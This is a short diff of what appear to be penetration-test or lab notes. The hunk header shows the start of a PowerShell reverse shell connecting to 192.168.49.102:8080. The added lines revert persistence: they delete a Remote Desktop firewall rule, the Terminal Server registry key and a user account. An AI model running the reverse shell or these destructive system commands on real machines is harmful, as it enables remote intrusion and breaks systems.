@@ -91,6 +91,11 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.49.102',8080);$stream
 reverted 101
 
 netsh advfirewall firewall delete rule name="Open Remote Desktop"
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
+net user /delete jack
+
+
+
 
 
 
